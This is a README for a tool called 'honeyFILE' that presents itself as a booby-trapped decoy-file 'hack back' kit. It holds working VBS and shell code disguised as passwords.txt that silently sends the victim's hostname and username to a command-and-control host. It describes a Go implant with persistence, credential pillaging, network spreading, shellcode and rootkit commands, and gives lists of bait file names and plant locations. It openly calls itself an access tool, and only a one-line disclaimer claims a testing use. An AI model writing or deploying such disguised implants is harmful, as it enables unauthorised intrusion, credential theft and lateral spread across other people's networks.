# honeyFILE

** brought to you by the fine people of: Church Of Malware xo **

### You don't secure your computer. You booby trap it.

**They steal `passwords.txt` from your desktop. You steal their entire network.**

---

## What This Is

A honeyfile is a decoy file that looks valuable but is actually a booby trap. When an adversary finds it, takes it, and opens it — they just gave you control of their machine.

- They think they stole your passwords
- They actually installed your implant
- They think they're in your network
- They actually just let you into theirs

**This is the oldest con in the book wrapped in 847 lines of Go.**

---

## How It Works

```
Adversary finds:             passwords.txt on your Desktop
Adversary thinks:            "Free creds, this guy is an idiot"  
Adversary opens:             passwords.txt
                              ↓
Your machine:                 Sends you callback with their IP, hostname, OS
                              ↓
Your C2 receives:             "New implant beacon: 203.0.113.55 | Windows 11 | CORP-DESK-03"
                              ↓
You send command:             pillage
                              ↓
Their machine:                Exfiltrates domain admin creds, VPN configs, SSH keys
                              ↓
You send command:             spread  
                              ↓
Their network:                Implant propagates to every reachable host
You now have:                 Control of their network
```

**They came for your passwords. You took their domain.**

---

## The Mechanisms

### Windows — The VBS Trap

Create `passwords.txt.vbs` — Windows hides the `.vbs` extension by default. It shows as `passwords.txt` in Explorer.

```vbscript
' They double-click "passwords.txt"
' wscript.exe runs this silently
' Their machine calls home to your C2
' No windows, no warnings, no trace
'
' What you receive:
'   IP, hostname, username, domain
'   Full callback → command session

On Error Resume Next
Set x = CreateObject("MSXML2.XMLHTTP")
Set n = CreateObject("WScript.Network")
x.Open "POST", "https://your-c2.com/beacon", False
x.Send "h=" & n.ComputerName & "&u=" & n.UserName & "&s=honeyfile"
```

### Linux — The Executable Trap

Create `passwords.txt` with executable permissions. They run `cat passwords.txt` — the shebang executes first.

```bash
#!/bin/sh
# They run: cat passwords.txt
# They get: a callback to your C2
# You get:  their IP and hostname
curl -s "https://your-c2.com/beacon?h=$(hostname)&u=$(whoami)" &
rm -f "$0"
```

### Cross-Platform — The Go Binary (Enterprise Grade)

Compile a single binary that masquerades as any file. One implant, 16 platforms.

```bash
./build.sh https://your-c2.com/beacon 3 passive-aggressive-trap

# Drop on target:
#   honeyfile_windows_amd64.exe  →  passwords.txt.exe  (Windows hides .exe)
#   honeyfile_linux_amd64        →  credentials.bin    (chmod +x, wait)
#   honeyfile_linux_arm5         →  router-config.bin  (drop on IoT device)
```

When they open it, the implant:
1. Callbacks to your C2 with full system intel
2. Installs persistence (systemd / Registry / LaunchAgent)
3. Waits for your commands — it does NOT self-destruct without your order
4. You own their machine until you say otherwise

---

## Hiding Honeyfiles — Don't Trigger Your Own Traps

**Rule: If you see a file named `passwords.txt` on YOUR desktop, and you didn't put it there, don't open it — investigate. The adversary won't know the difference.**

| Name | You Know | They Think | Result |
|------|----------|------------|--------|
| `passwords.txt` | You don't store passwords in plaintext | "Jackpot!" | 💀 |
| `bank-accounts.xlsx` | Not real | "Financial data!" | 💀 |
| `nudes.zip` | You're not that dumb | "..." | 💀 |
| `wallet-seed.txt` | Seeds are memorized or on steel | "Free crypto!" | 💀 |
| `server-credentials.txt` | SSH keys are in ~/.ssh | "Free servers!" | 💀 |
| `ssh-key-backup.tar.gz` | Not a real backup | "SSH keys!" | 💀 |
| `tax-returns-2026.pdf` | Already filed | "Maybe I can use this" | 💀 |
| `company-financials.xlsx` | Not on your personal machine | "Inside info!" | 💀 |

### Where to Plant

| Location | Why It Works |
|----------|-------------|
| `~/Desktop/passwords.txt` | First place they look |
| `~/Documents/bank-accounts.xlsx` | Second place they look |
| `~/.ssh/server-credentials.txt` | "Right next to real keys? Must be real" |
| `~/Downloads/vpn-configs.zip` | "Loose files in downloads = sloppy opsec" |
| `/var/www/html/config.php` | Web server config — dev crack |
| `C:\Users\Public\domain-passwords.txt` | Shared folder dump |

### How to Know If It Fired Without Opening It

```bash
# Check if the file still exists
ls -la ~/Desktop/passwords.txt

# If it's GONE → someone opened it → callback sent → you have intel
# If it's STILL THERE → nobody's been on your machine
```

The Go implant self-deletes after execution. The VBS trap delays deletion by 5 seconds. Either way: if the file vanishes, someone is in your shit and you just got their IP.

---

## What You Receive

When a honeyfile triggers, this lands in your C2:

```json
{
    "type": "honeyfile_beacon",
    "hostname": "CORP-DESK-03",
    "username": "jsmith",
    "domain": "CORP.LOCAL",
    "public_ip": "203.0.113.55",
    "local_ip": "10.10.50.42",
    "os": "windows",
    "arch": "amd64",
    "timestamp": "2026-07-30T00:29:00Z"
}
```

That's the appetizer. From here you can:

```
pillage  →  steal their domain admin creds, VPN, SSH keys, crypto wallets
spread   →  hop to every machine on their network
exec     →  run commands as them
screenshot → see what they're doing right now
shellcode → inject memory-resident payloads
rootkit  →  go kernel-mode, hide from everything
```

They stole your `passwords.txt`. You own their entire domain.

---

## Tradecraft Notes

### Don't Name It Stupid

 `virus.exe` — nobody opens this
 `totally-not-a-trojan.pdf` — even your grandma knows better
 `passwords.txt` — irresistible
 `tax-returns-2026.pdf` — seasonal, plausible
 `server-credentials.txt` — looks like a mistake left lying around

### Don't Leave Only One

Plant 5-10 honeyfiles across your system. Different names, different locations, different formats. One callback is good. Five callbacks from the same IP means you know they're actively browsing your files and you have their full attention.

### The Feedback Loop

If MULTIPLE honeyfiles fire from the same IP in rapid succession:
- They're in your shit
- They're copying files
- They're confident they found something good

This is also when the watchdog (see §9 of the whitepaper) fires the dead man's trigger if you have one armed. They're not just stealing files — they're accelerating their own destruction.

---

## Quick Start

```bash
# Clone
git clone https://git.churchofmalware.org/ek0mssavi0r/honeyFILE
cd honeyFILE

# Build all 16 platform implants
./build.sh https://your-c2.com/beacon 3 network-trap

# Deploy on your system(s)
cp build/honeyfile_windows_amd64.exe ~/Desktop/passwords.txt.exe
cp build/honeyfile_linux_amd64 ~/Documents/server-credentials.txt
chmod +x ~/Documents/server-credentials.txt

# Wait
# They take the bait
# You own their network
```

---

### The Golden Rule

> **A honeyfile is not a detection tool. It's an access tool.**
>
> You don't honeyfile to know someone's in your shit.
> You honeyfile so that when they're in your shit, you're in theirs.

`passwords.txt` protects your computer better than any antivirus. Because when they steal it, you steal everything they have.
 
 ---
 
 ## DISCLAIMER: for auth sec testing or edu training only
 
